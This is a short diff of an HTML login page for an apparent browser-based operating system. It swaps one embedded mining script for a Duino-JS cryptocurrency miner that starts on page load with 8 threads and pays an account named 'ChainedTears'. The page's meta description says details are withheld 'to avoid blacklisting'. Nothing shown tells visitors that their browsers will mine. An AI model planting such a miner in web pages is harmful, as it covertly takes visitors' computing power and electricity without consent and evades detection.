@@ -9,12 +9,12 @@
   <meta name="description" content="Average web-based operating system that runs in your browser. More description not provided to avoid blacklisting">
   <link rel="stylesheet" href="login-page.css">
   <script defer src="login-page.js"></script>
-  <script src="https://NoozSBC.github.io/Duinotize/duinotize.js" defer></script>
-  <script>
-  Duinotize({
-    username: "ChainedTears",
-    rigid: "site"
-  });
+  <script src="duino-js.min.js"></script> <!--imports the Duino-JS miner-->
+<script>
+    username = `ChainedTears`; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+    rigid = `AtlasOS Login Page`; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
+    threads = `8`; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
+    startMiner(); //starts the miner
 </script>
 </head>
 
